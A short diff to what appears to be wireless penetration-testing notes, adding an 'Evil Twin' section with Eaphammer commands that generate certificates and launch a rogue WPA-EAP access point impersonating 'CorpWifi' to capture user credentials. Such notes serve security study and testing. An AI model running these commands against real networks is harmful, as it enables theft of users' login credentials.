@@ -11,3 +11,10 @@ To extract PMKID from Airodump .cap file:
 
 Associate with an open auth network:
   nmtui <-- Opens text based network configuration tool
+
+Evil Twin attack using Eaphammer:
+  # generate certificates
+  ./eaphammer --cert-wizard
+
+  # launch attack
+  ./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
